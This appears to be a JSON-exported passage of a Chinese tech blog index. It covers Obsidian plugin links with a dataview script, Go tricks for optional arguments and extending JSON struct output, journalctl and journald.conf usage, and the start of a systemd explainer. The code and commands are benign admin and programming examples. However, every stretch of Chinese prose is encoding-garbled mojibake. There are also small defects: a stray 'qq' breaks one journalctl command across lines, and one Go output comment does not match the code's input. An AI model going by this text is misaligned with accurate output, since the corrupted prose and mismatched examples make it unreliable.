å…¥é—¨æ•™ç¨‹\n\n+ Obsidianè®ºå› https://forum-zh.obsidian.md/\n+ ç¤¾åŒºæ’ä»¶ï¼šhttps://airtable.com/shrdmp10Lxmf5Wmgl/tblJqnWpcKURTjysX\n+ æ“ä½œå…¥é—¨ï¼š\n  + https://sspai.com/post/67476\n  + https://zhuanlan.zhihu.com/p/428519519\n  + https://catcoding.me/p/obsidian-for-programmer/\n  + https://publish.obsidian.md/chinesehelp/01+2021%E6%96%B0%E6%95%99%E7%A8%8B/2021%E5%B9%B4%E6%96%B0%E6%95%99%E7%A8%8B\n\n+ æ’ä»¶æŠ˜è…¾\n  + https://sspai.com/post/68394\n  + https://forum-zh.obsidian.md/t/topic/8728\n\n\n\n\n### 3.2 Kanban ä½¿ç”¨\n\n\n\n### 3.3 QuickAdd + dataview\n\nhttps://forum-zh.obsidian.md/t/topic/200\n\n\n\n### 3.4 Dataview\n\nhttps://zhuanlan.zhihu.com/p/373623264\n\n```dataviewjs\nlet d = {}\nfunction process(k, v) {\n  Object.keys(v).forEach(function (x) {\n    x = dv.fileLink(x);\n    if (d[x]==undefined) { d[x] = []; }\n\td[x].push(dv.fileLink(k));\n  });\n}\nObject.entries(dv.app.metadataCache.unresolvedLinks)\n\t.filter(([k,v])=>Object.keys(v).length)\n\t.forEach(([k,v]) => process(k, v));\ndv.table([\"Non existing notes\", \"Linked from\"],\n         Object.entries(d).map(([k,v])=> [k, v.join(\" â€¢ \")]))\n```\n\n### 3.5 ç¼–è¾‘\n\n+ [å¼€å¯obsidianæ‚¬æµ®æ¨¡å¼ï¼Œæå¥½çš„ç¼–è¾‘ä½“éªŒ - ç»éªŒåˆ†äº« - Obsidian ä¸­æ–‡è®ºå›](https://forum-zh.obsidian.md/t/topic/5676)\n\n\n\n### 3.6 æ ¼å¼åŒ–\n\n+ https://github.com/platers/obsidian-linter\n+ https://github.com/Yaozhuwa/easy-typing-obsidian\n","categories":["ç¬”è®°"]},{"title":"golangçš„ä¸€äº›å¥‡æŠ€æ·«å·§","url":"%2Fp%2Fc79ad2a9.html","content":"\nå¥½ä¹…æ²¡å†™golangç›¸å…³çš„blogäº†, è®°å½•ä¸€äº›å¸¸è§çš„golangæŠ€å·§ã€‚\n\n# 1. ä¸å½±å“å‡½æ•°è°ƒç”¨, å¢åŠ å‚æ•°\n\nå…ˆçœ‹ä»¥ä¸‹å‡½æ•°è°ƒç”¨:\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc ExecUser(name string, age int) {\n\tfmt.Println(\"name:\", name, \"age:\", age)\n}\n\nfunc main() {\n\tExecUser(\"levonfly\", 9)\n}\n\n// name: levonfly age: 9\n```\n\n<!-- more -->\n\nè¿™æ—¶å€™æˆ‘æƒ³åœ¨åŸå‡½æ•°å‚æ•°ä¸­ä¼ å…¥æˆ‘çš„é‚®ç®±ç­‰ä¿¡æ¯, ä¸ä»…éœ€è¦ä¿®æ”¹å‡½æ•°å®šä¹‰, è¿˜ä¼šå½±å“ä»¥å‰çš„è°ƒç”¨.\n\nåœ¨ä¸å½±å“ä»¥å‰å‡½æ•°è°ƒç”¨çš„æƒ…å†µä¸‹, æ”¯æŒåŠ¨æ€ä¼ å‚.  å¹¶ä¸”åœ¨åŠ¨æ€çš„åŸºç¡€ä¸ŠåŠ ä¸Š key\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ArgFunc func() (key string, value string)\n\nfunc BuildArgFunc(key string, value string) ArgFunc {\n\treturn func() (k string, v string) {\n\t\tk = key\n\t\tv = value\n\t\treturn\n\t}\n}\n\nfunc ExecUser(name string, age int, funcArgs ...ArgFunc) {\n\tfmt.Println(\"name:\", name, \"age:\", age)\n\tfor _, funcArg := range funcArgs {\n\t\tk, v := funcArg()\n\t\tfmt.Println(k, v)\n\t}\n}\n\nfunc main() {\n\tExecUser(\"levonfly\", 9)\n\tExecUser(\"levonfly\", 9, BuildArgFunc(\"email\", \"levonfly@gmail.com\"))\n\tExecUser(\"levonfly\", 9, BuildArgFunc(\"email\", \"levonfly@gmail.com\"), BuildArgFunc(\"sex\", \"man\"))\n}\n\n/*\nname: levonfly age: 9\n\nname: levonfly age: 9\nemail levonfly@gmail.com\n\nname: levonfly age: 9\nemail levonfly@gmail.com\nsex man\n*/\n```\n\n\n\n# 2. ä¸´æ—¶å¢åŠ structå­—æ®µ\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\nfunc main() {\n\toutputJson(Fixed{Name: \"levon\", Age: 9})\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n// {\"name\":\"levon\",\"age\":9}\n```\n\nFixedå‡è®¾æ˜¯åˆ«äººå®šä¹‰çš„ç»“æ„ä½“, ä¸èƒ½ä¿®æ”¹, ä½†æ˜¯æˆ‘è¦æƒ³è®©ç»“æ„ä½“å¢åŠ ä¸€ä¸‹å½“å‰çš„æ—¶é—´\n\n\n\n### 2.1 ä¸´æ—¶structå¢åŠ å­—æ®µ\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\nfunc main() {\n\to := struct {\n\t\tFixed\n\t\tTime string `json:\"time\"`\n\t}{\n\t\tFixed: Fixed{Name: \"levon\", Age: 9},\n\t\tTime:  time.Now().Format(\"2006-01-02\"),\n\t}\n\toutputJson(o)\n}\n\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n\n// {\"name\":\"levon\",\"age\":9,\"time\":\"2021-06-29\"}\n```\n\n\n\n### 2.2 ä¸´æ—¶structé‡å†™json\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\ntype NewFixed struct {\n\tFixed\n}\n\nfunc (u *NewFixed) MarshalJSON() ([]byte, error) {\n\ttype Alias NewFixed\n\treturn json.Marshal(&struct {\n\t\t*Alias\n\t\tTime string `json:\"time\"`\n\t}{\n\t\tAlias: (*Alias)(u),\n\t\tTime:  time.Now().Format(\"2006-01-02\"),\n\t})\n}\n\nfunc main() {\n\toutputJson(&NewFixed{Fixed{Name: \"levonfly\", Age: 9}})\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n\n// {\"name\":\"levon\",\"age\":9,\"time\":\"2021-06-29\"}\n```\n\n\n\n# 3. ä¸´æ—¶ä¸ºstructå¢åŠ ä¸€ä¸ªåŠ¨æ€ç»“æ„ä½“\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Info struct {\n\tA string `json:\"a\"`\n\tB int    `json:\"b\"`\n\tC string `json:\"c\"`\n}\n\nfunc main() {\n\tinfo := &Info{A: \"str1\", B: 100, C: \"str2\"}\n\toutputJson(info)\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n//{\"a\":\"str1\",\"b\":100,\"c\":\"str2\"}\n```\n\nè¿™æ—¶å€™åŠ å…¥ä¸€ä¸ªåŠ¨æ€çš„ç»“æ„ä½“, ä¾‹å¦‚ä¸‹é¢æœ‰å¯èƒ½æ˜¯1ä¸ªdçš„ç»“æ„, ä¹Ÿæœ‰å¯èƒ½æ˜¯ 2ä¸ªå±æ€§e,f çš„ç»“æ„,  å¹¶æŠŠä»–ä»¬ç»„åˆ\n\n```bash\n{\"d\":\"123\"}\n{\"e\":\"123\", \"f\":200}\n```\n\n\n\nè§£å†³æ€è·¯å°±æ˜¯å€’å…¥åˆ°ä¸€ä¸ª map[string]interface{} é‡Œ\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Info struct {\n\tA string `json:\"a\"`\n\tB int    `json:\"b\"`\n\tC string `json:\"c\"`\n}\n\nfunc main() {\n\tinfo := &Info{A: \"str1\", B: 100, C: \"str2\"}\n\n\t// è¿™é‡Œæ¥äº†ä¸¤ä¸ªæµ‹è¯•çš„åŠ¨æ€ç»“æ„\n\tvars1 := `{\"d\":\"123\"}`\n\tvars2 := `{\"e\":\"123\", \"f\":200}`\n\n\toutPuts := make(map[string]interface{})\n\trespByte, _ := json.Marshal(info)\n\t_ = json.Unmarshal(respByte, &outPuts)\n\t_ = json.Unmarshal([]byte(vars1), &outPuts)\n\t_ = json.Unmarshal([]byte(vars2), &outPuts)\n\n\toutputJson(outPuts)\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n//{\"a\":\"str1\",\"b\":100,\"c\":\"str2\",\"d\":\"123\",\"e\":\"123\",\"f\":200}\n```\n\n\n\n# 4. structå’Œinterface\n\n### 4.1 é™åˆ¶ä¸€ä¸ªstructå®ç°interface\n\nå¦‚æœ`Engine` æ²¡æœ‰å®ç°`Engine`, ä¼šæŠ¥é”™.\n\n```go\nvar _ IRouter = &Engine{}\nvar _ IRouter = (*Engine)(nil)\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/27472716\n+ http://choly.ca/post/go-json-marshalling/","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"journalæ—¥å¿—ç®¡ç†","url":"%2Fp%2F9a741526.html","content":"\nSystemd ç»Ÿä¸€ç®¡ç†æ‰€æœ‰ Unit çš„å¯åŠ¨æ—¥å¿—ã€‚å¸¦æ¥çš„å¥½å¤„å°±æ˜¯ï¼Œå¯ä»¥åªç”¨`journalctl`ä¸€ä¸ªå‘½ä»¤ï¼ŒæŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼ˆå†…æ ¸æ—¥å¿—å’Œåº”ç”¨æ—¥å¿—ï¼‰ã€‚æ—¥å¿—çš„é…ç½®æ–‡ä»¶æ˜¯`/etc/systemd/journald.conf`ã€‚\n\n<!-- more -->\n\nSystemd çš„æ—¥å¿—æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„ï¼Œå¿…é¡»ä½¿ç”¨ Journald æä¾›çš„ journalctl æ¥æŸ¥çœ‹ï¼Œé»˜è®¤ä¸å¸¦ä»»ä½•å‚æ•°æ—¶ä¼šè¾“å‡ºç³»ç»Ÿå’Œæ‰€æœ‰åå°è¿›ç¨‹çš„æ··åˆæ—¥å¿—ã€‚\n\né»˜è®¤æ—¥å¿—æœ€å¤§é™åˆ¶ä¸ºæ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿå®¹é‡çš„ 10%ï¼Œå¯ä»¥ä¿®æ”¹ /etc/systemd/journald.conf ä¸­çš„ SystemMaxUse æ¥æŒ‡å®šè¯¥æœ€å¤§é™åˆ¶ã€‚\n\n# 1. é…ç½®æ–‡ä»¶\n\né»˜è®¤çŠ¶æ€æ‰€æœ‰é€‰é¡¹å‡ä¸ºæ³¨é‡ŠçŠ¶æ€\n\n```bash\n[Journal]\nStorage=auto           #å­˜å‚¨æ—¥å¿—æ–‡ä»¶ä½ç½®ï¼ˆ\"volatile\" è¡¨ç¤ºä»…ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè·¯å¾„ï¼š/run/log/journal ã€\"persistent\" è¡¨ç¤ºä¼˜å…ˆä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œè·¯å¾„ï¼šä¼˜å…ˆä¿å­˜åœ¨ /var/log/journalã€\"auto\"é»˜è®¤å€¼ã€\"none\"ä¸ä¿å­˜ä»»ä½•æ—¥å¿—ï¼‰\nCompress=yes            #å‹ç¼©å­˜å‚¨å¤§äºç‰¹å®šé˜ˆå€¼çš„å¯¹è±¡\nSeal=yes          #å¦‚æœå­˜åœ¨ä¸€ä¸ª\"sealing key\"ï¼Œ é‚£ä¹ˆå°±ä¸ºæ‰€æœ‰æŒä¹…ä¿å­˜çš„æ—¥å¿—æ–‡ä»¶å¯ç”¨ FSSéªŒè¯\nSplitMode=uid   #æ˜¯å¦æŒ‰ç”¨æˆ·è¿›è¡Œæ—¥å¿—åˆ†å‰²ï¼ˆåˆ†å‰²ç­–ç•¥ï¼š\"uid\" è¡¨ç¤ºæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸“å±æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·ä»å†™è¿›ç³»ç»Ÿæ—¥å¿—ï¼Œ\"none\" ä¸è¿›è¡Œæ—¥å¿—åˆ†å‰²ï¼Œæ‰€æœ‰ç”¨æˆ·æ—¥å¿—å‡å†™è¿›ç³»ç»Ÿæ—¥å¿—\nSyncIntervalSec=5m    #å‘ç£ç›˜åˆ·å†™æ—¥å¿—æ—¶é—´é—´éš”ï¼ˆerrorä»¥ä¸Šï¼Œä¸å«errorçº§åˆ«æ—¥å¿—ä¼šç«‹å³åˆ·å†™ï¼‰\nRateLimitInterval=30s    \nRateLimitBurst=1000    #ä¸Šä¸‹ä¸¤ä¸ªé€‰é¡¹è¡¨ç¤ºåœ¨30så†…æ¯ä¸ªæœåŠ¡æœ€å¤šçºªå½•1000æ¡æ—¥å¿—ï¼Œå¤šä½™æ—¥å¿—ä¸¢å¼ƒ\nSystemMaxUse=       #å…¨éƒ¨æ—¥å¿—æœ€å¤§å ç”¨ç£ç›˜ç©ºé—´\nSystemKeepFree=     #é™¤æ—¥å¿—æ–‡ä»¶ä¹‹å¤–ï¼Œè‡³å°‘ä¿ç•™å¤šå°‘ç©ºé—´ç»™å…¶ä»–ç”¨é€”ï¼ˆç£ç›˜ï¼‰\nSystemMaxFileSize=     #å•ä¸ªæ—¥å¿—æ–‡ä»¶æœ€å¤§å ç”¨ç£ç›˜ç©ºé—´\nRuntimeMaxUse=      #å…¨éƒ¨æ—¥å¿—æœ€å¤§å ç”¨å†…å­˜ç©ºé—´\nRuntimeKeepFree=    #é™¤æ—¥å¿—æ–‡ä»¶ä¹‹å¤–ï¼Œè‡³å°‘ä¿ç•™å¤šå°‘ç©ºé—´ç»™å…¶ä»–ç”¨é€”ï¼ˆå†…å­˜ï¼‰\nRuntimeMaxFileSize=     #å•ä¸ªæ—¥å¿—æ–‡ä»¶æœ€å¤§å ç”¨å†…å­˜å¤§å°\nMaxRetentionSec=      #æ—¥å¿—æ–‡ä»¶æœ€å¤§ä¿ç•™æœŸé™ï¼ˆè¶…è¿‡è¯¥æ—¶é—´è‡ªåŠ¨åˆ é™¤ï¼‰\nMaxFileSec=1month     #æ—¥å¿—æ»šåŠ¨æ—¶é—´é—´éš”\nForwardToSyslog=yes   #è¡¨ç¤ºæ˜¯å¦å°†æ¥æ”¶åˆ°çš„æ—¥å¿—æ¶ˆæ¯è½¬å‘ç»™ä¼ ç»Ÿçš„ syslog å®ˆæŠ¤è¿›ç¨‹\nForwardToKMsg=no        #è¡¨ç¤ºæ˜¯å¦å°†æ¥æ”¶åˆ°çš„æ—¥å¿—æ¶ˆæ¯è½¬å‘ç»™å†…æ ¸æ—¥å¿—ç¼“å†²åŒº(kmsg)\nForwardToConsole=no    #è¡¨ç¤ºæ˜¯å¦å°†æ¥æ”¶åˆ°çš„æ—¥å¿—æ¶ˆæ¯è½¬å‘ç»™ç³»ç»Ÿæ§åˆ¶å°\nForwardToWall=yes      #è¡¨ç¤ºæ˜¯å¦å°†æ¥æ”¶åˆ°çš„æ—¥å¿—æ¶ˆæ¯ä½œä¸ºè­¦å‘Šä¿¡æ¯å‘é€ç»™æ‰€æœ‰å·²ç™»å½•ç”¨æˆ·\nTTYPath=/dev/console     \nMaxLevelStore=debug      #è¡¨ç¤ºè®°å½•åˆ°æ—¥å¿—ä¸­çš„æœ€é«˜æ—¥å¿—ç­‰çº§\nMaxLevelSyslog=debug     #è½¬å‘ç»™syslogè¿›ç¨‹çš„æœ€é«˜æ—¥å¿—ç­‰çº§\nMaxLevelKMsg=notice     #è½¬å‘ç»™å†…æ ¸æ—¥å¿—ç¼“å†²åŒº(kmsg)çš„æœ€é«˜æ—¥å¿—ç­‰çº§\nMaxLevelConsole=info     #è½¬å‘ç»™ç³»ç»Ÿæ§åˆ¶å°çš„æœ€é«˜æ—¥å¿—ç­‰çº§\nMaxLevelWall=emerg     #ç½®ä½œä¸ºè­¦å‘Šä¿¡æ¯å‘é€ç»™æ‰€æœ‰å·²ç™»å½•ç”¨æˆ·çš„æœ€é«˜æ—¥å¿—ç­‰çº§\nLineMax=48K     #æ¯æ¡æ—¥å¿—è®°å½•æœ€å¤§çš„å­—èŠ‚é•¿åº¦ï¼Œè¶…é•¿éƒ¨åˆ†è‡ªåŠ¨æ‰“åˆ†å‰²ç¬¦è¿›è¡Œåˆ†å‰²\n```\n\n\n\n# 2. å‘½ä»¤\n\n### 2.1 æŸ¥çœ‹æ—¥å¿—\n\n```bash\n# æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼ˆé»˜è®¤æƒ…å†µä¸‹ ï¼Œåªä¿å­˜æœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿—ï¼‰\n$ sudo journalctl\n\n# æ˜¾ç¤ºå°¾éƒ¨çš„æœ€æ–°10è¡Œæ—¥å¿—\n$ sudo journalctl -n\n\n# æ˜¾ç¤ºå°¾éƒ¨æŒ‡å®šè¡Œæ•°çš„æ—¥å¿—\n$ sudo journalctl -n 20\n\n# å®æ—¶æ»šåŠ¨æ˜¾ç¤ºæœ€æ–°æ—¥å¿—\n$ sudo journalctl -f\n\n# æŸ¥çœ‹æŒ‡å®šæ—¶é—´çš„æ—¥å¿—\n$ sudo journalctl --since=\"2012-10-30 18:17:16\"\n$ sudo journalctl --since \"20 min ago\"\n$ sudo journalctl --since yesterday\n$ sudo journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\"\n$ sudo journalctl --since 09:00 --until \"1 hour ago\"\n\n\n# æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼ˆä¸æ˜¾ç¤ºåº”ç”¨æ—¥å¿—ï¼‰\n$ sudo journalctl -k\n\n# æŸ¥çœ‹ç³»ç»Ÿæœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿—\n$ sudo journalctl -b\n$ sudo journalctl -b -0\n\n# æŸ¥çœ‹ä¸Šä¸€æ¬¡å¯åŠ¨çš„æ—¥å¿—ï¼ˆéœ€æ›´æ”¹è®¾ç½®ï¼‰\n$ sudo journalctl -b -1\n\n\n# æŸ¥çœ‹æŒ‡å®šä¼˜å…ˆçº§ï¼ˆåŠå…¶ä»¥ä¸Šçº§åˆ«ï¼‰çš„æ—¥å¿—ï¼Œå…±æœ‰8çº§ 0: emerg 1: alert 2: crit 3: err 4: warning 5: notice 6: info 7: debug\n$ sudo journalctl -p err -b\n```\n\n\n\n### 2.2 æŸ¥çœ‹æŒ‡å®šæœåŠ¡æ—¥å¿—\n\n```bash\n# æŸ¥çœ‹æŒ‡å®šæœåŠ¡çš„æ—¥å¿—\n$ sudo journalctl /usr/lib/systemd/systemd\n\n# æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çš„æ—¥å¿—\n$ sudo journalctl _PID=1\n\n# æŸ¥çœ‹æŸä¸ªè·¯å¾„çš„è„šæœ¬çš„æ—¥å¿—\n$ sudo journalctl /usr/bin/bash\n\n# æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—\n$ sudo journalctl _UID=33 --since today\n\n# æŸ¥çœ‹æŸä¸ª Unit çš„æ—¥å¿—\n$ sudo journalctl -u nginx.service\n$ sudo journalctl -u nginx.service --since today\n\n# å®æ—¶æ»šåŠ¨æ˜¾ç¤ºæŸä¸ª Unit çš„æœ€æ–°æ—¥å¿—\n$ sudo journalctl -u nginx.service -f\n\n# åˆå¹¶æ˜¾ç¤ºå¤šä¸ª Unit çš„æ—¥å¿—\n$ journalctl -u nginx.service -u php-fpm.service --since today\n```\n\n\n\n### 2.3 æ ¼å¼æŸ¥çœ‹\n\n```bash\n# æ—¥å¿—é»˜è®¤åˆ†é¡µè¾“å‡ºï¼Œ--no-pager æ”¹ä¸ºæ­£å¸¸çš„æ ‡å‡†è¾“å‡º\n$ sudo journalctl --no-pager\n\n# ä»¥ JSON æ ¼å¼ï¼ˆå•è¡Œï¼‰è¾“å‡º\n$ sudo journalctl -b -u nginx.service -o json\n\n# ä»¥ JSON æ ¼å¼ï¼ˆå¤šè¡Œï¼‰è¾“å‡ºï¼Œå¯è¯»æ€§æ›´å¥½\n$ sudo journalctl -b -u nginx.serviceqq\n -o json-pretty\n```\n\n\n\n### 2.4 æŸ¥çœ‹å­˜å‚¨\n\n```bash\n# æ˜¾ç¤ºæ—¥å¿—å æ®çš„ç¡¬ç›˜ç©ºé—´\n$ sudo journalctl --disk-usage\n\n# ä»…ä¿ç•™500MBå¤§å°çš„æ—¥å¿—æ–‡\n$ sudo journalctl --vacuum-size=500M\n\n# æŒ‡å®šæ—¥å¿—æ–‡ä»¶ä¿å­˜å¤šä¹…\n$ sudo journalctl --vacuum-time=1years\n\n# ä»…ä¿ç•™æœ€è¿‘ä¸€ä¸ªæœˆçš„æ—¥å¿—æ–‡ä»¶\n$ sudo journalctl --vacuum-time=1m\n\n# ä»…ä¿ç•™æœ€è¿‘2å¤©çš„æ—¥å¿—æ–‡ä»¶\n$ sudo journalctl --vacuum-time=2d\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html","tags":["journal"],"categories":["å‘½ä»¤"]},{"title":"systemdå’Œsystemctlè¯¦è§£","url":"%2Fp%2Fc9c96ac3.html","content":"\n# 1. Systemd\n\n### 1.1 å‰è¨€\n\nå†å²ä¸Šï¼ŒLinux çš„å¯åŠ¨ä¸€ç›´é‡‡ç”¨initè¿›ç¨‹ã€‚ Systemd è®¾è®¡ç›®æ ‡æ˜¯ï¼Œä¸ºç³»ç»Ÿçš„å¯åŠ¨å’Œç®¡ç†æä¾›ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚\n\nSystemd æ˜¯ä¸€ç³»åˆ—å·¥å…·çš„é›†åˆï¼Œå…¶ä½œç”¨ä¹Ÿè¿œè¿œä¸ä»…æ˜¯å¯åŠ¨æ“ä½œç³»ç»Ÿï¼Œå®ƒè¿˜æ¥ç®¡äº†åå°æœåŠ¡ã€ç»“æŸã€çŠ¶æ€æŸ¥è¯¢ï¼Œä»¥åŠæ—¥å¿—å½’æ¡£ã€è®¾å¤‡ç®¡ç†ã€ç”µæºç®¡ç†ã€å®šæ—¶ä»»åŠ¡ç­‰è®¸å¤šèŒè´£ï¼Œå¹¶æ”¯æŒé€šè¿‡ç‰¹å®šäº‹ä»¶ï¼ˆå¦‚æ’å…¥ç‰¹å®š USB è®¾å¤‡ï¼‰å’Œç‰¹å®šç«¯å£æ•°æ®è§¦å‘çš„ On-demandï¼ˆæŒ‰éœ€ï¼‰ä»»åŠ¡ã€‚\n\nSystemd çš„åå°æœåŠ¡è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„èº«ä»½â€”â€”å®ƒæ˜¯ç³»ç»Ÿä¸­ PID å€¼ä¸º 1 çš„è¿›ç¨‹ã€‚\n\n<!-- more -->\n\n### 1.2 ç‰¹ç‚¹\n\n+ æ›´å°‘çš„è¿›ç¨‹\n\n  Systemd æä¾›äº† æœåŠ¡æŒ‰éœ€å¯åŠ¨ çš„èƒ½åŠ›ï¼Œä½¿å¾—ç‰¹å®šçš„æœåŠ¡åªæœ‰åœ¨çœŸå®šè¢«è¯·æ±‚æ—¶æ‰å¯åŠ¨ã€‚\n\n+ å…è®¸æ›´å¤šçš„è¿›ç¨‹å¹¶è¡Œå¯åŠ¨\n\n  åœ¨ SysV-init æ—¶ä»£ï¼Œå°†æ¯ä¸ªæœåŠ¡é¡¹ç›®ç¼–å·ä¾æ¬¡æ‰§è¡Œå¯åŠ¨è„šæœ¬ã€‚Ubuntu çš„ Upstart è§£å†³äº†æ²¡æœ‰ç›´æ¥ä¾èµ–çš„å¯åŠ¨ä¹‹é—´çš„å¹¶è¡Œå¯åŠ¨ã€‚è€Œ Systemd é€šè¿‡ Socket ç¼“å­˜ã€DBus ç¼“å­˜å’Œå»ºç«‹ä¸´æ—¶æŒ‚è½½ç‚¹ç­‰æ–¹æ³•è¿›ä¸€æ­¥è§£å†³äº†å¯åŠ¨è¿›ç¨‹ä¹‹é—´çš„ä¾èµ–ï¼Œåšåˆ°äº†æ‰€æœ‰ç³»ç»ŸæœåŠ¡å¹¶å‘å¯åŠ¨ã€‚å¯¹äºç”¨æˆ·è‡ªå®šä¹‰çš„æœåŠ¡ï¼ŒSystemd å…è®¸é…ç½®å…¶å¯åŠ¨ä¾èµ–é¡¹ç›®ï¼Œä»è€Œç¡®ä¿æœåŠ¡æŒ‰å¿…è¦çš„é¡ºåºè¿è¡Œã€‚\n\n+ ä½¿ç”¨ CGroup è·Ÿè¸ªå’Œç®¡ç†è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ\n\n  åœ¨ Systemd ä¹‹é—´çš„ä¸»æµåº”ç”¨ç®¡ç†æœåŠ¡éƒ½æ˜¯ä½¿ç”¨ è¿›ç¨‹æ ‘ æ¥è·Ÿè¸ªåº”ç”¨çš„ç»§æ‰¿å…³ç³»çš„ï¼Œè€Œè¿›ç¨‹çš„çˆ¶å­å…³ç³»å¾ˆå®¹æ˜“é€šè¿‡ ä¸¤æ¬¡ fork çš„æ–¹æ³•è„±ç¦»ã€‚\n\n  è€Œ Systemd åˆ™æä¾›é€šè¿‡ CGroup è·Ÿè¸ªè¿›ç¨‹å…³ç³»ï¼Œå¼•è¡¥äº†è¿™ä¸ªç¼ºæ¼ã€‚é€šè¿‡ CGroup ä¸ä»…èƒ½å¤Ÿå®ç°æœåŠ¡ä¹‹é—´è®¿é—®éš”ç¦»ï¼Œé™åˆ¶ç‰¹å®šåº”ç”¨ç¨‹åºå¯¹ç³»ç»Ÿèµ„æºçš„è®¿é—®é…é¢ï¼Œè¿˜èƒ½æ›´ç²¾ç¡®åœ°ç®¡ç†æœåŠ¡çš„ç”Ÿå‘½å‘¨æœŸã€‚\n\n+ ç»Ÿä¸€ç®¡ç†æœåŠ¡æ—¥å¿—\n\n  Systemd æ˜¯ä¸€ç³»åˆ—å·¥å…·çš„é›†åˆï¼Œ åŒ…æ‹¬äº†ä¸€ä¸ªä¸“ç”¨çš„ç³»ç»Ÿæ—¥å¿—ç®¡ç†æœåŠ¡ï¼šJournaldã€‚è¿™ä¸ªæœåŠ¡çš„è®¾è®¡åˆè¡·æ˜¯å…‹æœç°æœ‰ Syslog æœåŠ¡çš„æ—¥å¿—å†…å®¹æ˜“ä¼ªé€ å’Œæ—¥å¿—æ ¼å¼ä¸ç»Ÿä¸€ç­‰ç¼ºç‚¹ï¼ŒJournald ç”¨ äºŒè¿›åˆ¶æ ¼å¼ ä¿å­˜æ‰€æœ‰çš„æ—¥å¿—ä¿¡æ¯ï¼Œå› è€Œæ—¥å¿—å†…å®¹å¾ˆéš¾è¢«æ‰‹å·¥ä¼ªé€ ã€‚Journald è¿˜æä¾›äº†ä¸€ä¸ª journalctl å‘½ä»¤æ¥æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ï¼Œè¿™æ ·å°±ä½¿å¾—ä¸åŒæœåŠ¡è¾“å‡ºçš„æ—¥å¿—å…·æœ‰ç›¸åŒçš„æ’ç‰ˆæ ¼å¼ï¼Œ ä¾¿äºæ•°æ®çš„äºŒæ¬¡å¤„ç†ã€‚\n\n### 1.3 Unit å’Œ Target\n\nUnit æ˜¯ Systemd ç®¡ç†ç³»ç»Ÿèµ„æºçš„åŸºæœ¬å•å…ƒï¼Œå¯ä»¥è®¤ä¸ºæ¯ä¸ªç³»ç»Ÿèµ„æºå°±æ˜¯ä¸€ä¸ª Unitï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ª Unit æ–‡ä»¶å®šä¹‰ã€‚åœ¨ Unit æ–‡ä»¶ä¸­éœ€è¦åŒ…å«ç›¸åº”æœåŠ¡çš„æè¿°ã€å±æ€§ä»¥åŠéœ€è¦è¿è¡Œçš„å‘½ä»¤ã€‚\n\nTarget æ˜¯ Systemd ä¸­ç”¨äºæŒ‡å®šç³»ç»Ÿèµ„æºå¯åŠ¨ç»„çš„æ–¹å¼ï¼Œç›¸å½“äº SysV-init ä¸­çš„è¿è¡Œçº§åˆ«ã€‚\n\nç®€å•è¯´ï¼ŒTarget å°±æ˜¯ä¸€ä¸ª Unit ç»„ï¼ŒåŒ…å«è®¸å¤šç›¸å…³çš„ Unit ã€‚å¯åŠ¨æŸä¸ª Target çš„æ—¶å€™ï¼ŒSystemd å°±ä¼šå¯åŠ¨é‡Œé¢æ‰€æœ‰çš„ Unitã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼ŒTarget è¿™ä¸ªæ¦‚å¿µç±»ä¼¼äºâ€çŠ¶æ€ç‚¹â€ï¼Œå¯åŠ¨æŸä¸ª Target å°±å¥½æ¯”å¯åŠ¨åˆ°æŸç§çŠ¶æ€ã€‚\n\n\n\n### 1.4 Systemd ç›®å½•\n\nUnit æ–‡ä»¶æŒ‰ç…§ Systemd 